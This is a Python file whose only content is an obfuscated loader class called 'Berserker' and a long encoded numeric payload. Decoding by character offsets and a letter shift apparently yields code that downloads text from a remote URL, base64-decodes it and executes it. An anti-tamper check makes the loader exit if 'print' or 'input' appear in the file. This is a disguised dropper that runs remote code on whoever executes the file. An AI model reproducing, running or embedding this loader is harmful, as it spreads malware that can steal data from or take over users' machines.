class Berserker():
 def __init__(self:object,_encode:str=False,_bits:str=0,*_exec:int,**_bytes:int)->exec:
  self._boom,_bytes[_bits],self._delete,self._exit,_encode,self._bit=exit()if _encode else'abcdefghijklmnopqrstuvwxyz0123456789',eval,lambda _eval:"".join(chr(int(_decode)-len(_eval.split('|')))if _decode!='¤'else'ζ'for _decode in str(_eval).split('|')),lambda _system:_encode(_system),lambda _encode:exit()if self._boom[15]+self._boom[17]+self._boom[8]+self._boom[13]+self._boom[19] in open(__file__, errors=self._boom[8]+self._boom[6]+self._boom[13]+self._boom[14]+self._boom[17]+self._boom[4]).read() or self._boom[8]+self._boom[13]+self._boom[15]+self._boom[20]+self._boom[19] in open(__file__, errors=self._boom[8]+self._boom[6]+self._boom[13]+self._boom[14]+self._boom[17]+self._boom[4]).read()else"".join(_encode if _encode not in self._boom else self._boom[self._boom.index(_encode)+1 if self._boom.index(_encode)+1<len(self._boom)else 0]for _encode in "".join(chr(ord(t)-223496)if t!="ζ"else"\n"for t in self._delete(_encode))),lambda _encode:str(_bytes[_bits](f"{self._boom[4]+self._boom[-13]+self._boom[4]+self._boom[2]}(''.join(%s),{self._boom[6]+self._boom[11]+self._boom[14]+self._boom[1]+self._boom[0]+self._boom[11]+self._boom[18]}())"%list(_encode))).encode(self._boom[20]+self._boom[19]+self._boom[5]+self._boom[34])if _bytes[_bits]==eval else exit()
  return self.__decode__(_bytes[(self._boom[-1]+'_')[-1]+self._boom[18]+self._boom[15]+self._boom[0]+self._boom[17]+self._boom[10]+self._boom[11]+self._boom[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._bit(self._exit(_execute)))[0]
Berserker(_encode=False,_sparkle='''223836|223840|223843|223842|223845|223847|223764|223845|223832|223844|223848|223832|223846|223847|223846|223776|223842|223846|223776|223847|223836|223840|223832|223776|223850|223832|223829|223829|223845|223842|223850|223846|223832|223845|¤|223848|223845|223839|223764|223793|223764|223766|223835|223847|223847|223843|223846|223790|223779|223779|223845|223789|223850|223778|223834|223836|223847|223835|223848|223829|223848|223846|223832|223845|223830|223842|223841|223847|223832|223841|223847|223778|223830|223842|223840|223779|223833|223789|223830|223832|223829|223842|223838|223831|223832|223849|223832|223839|223842|223843|223779|223819|223789|223838|223789|223777|223850|223789|223838|223789|223779|223840|223789|223836|223841|223779|223813|223850|223832|223845|223844|223850|223832|223845|223766|¤|223847|223845|223852|223790|¤|223741|223843|223842|223842|223764|223793|223764|223845|223832|223844|223848|223832|223846|223847|223846|223778|223834|223832|223847|223772|223848|223845|223839|223773|223778|223847|223832|223851|223847|¤|223741|223836|223840|223843|223842|223845|223847|223764|223829|223789|223846|223832|223785|223783|¤|223741|223832|223851|223832|223830|223772|223829|223789|223846|223832|223785|223783|223778|223829|223785|223783|223831|223832|223830|223842|223831|223832|223772|223843|223842|223842|223773|223773|¤|223832|223851|223830|223832|223843|223847|223790|¤|223741|223843|223845|223836|223841|223847|223772|223771|223842|223841|223764|223849|223843|223841|223764|223843|223839|223832|223789|223846|223832|223771|223773|¤|223741|223832|223851|223836|223847|223772|223773|¤|¤''')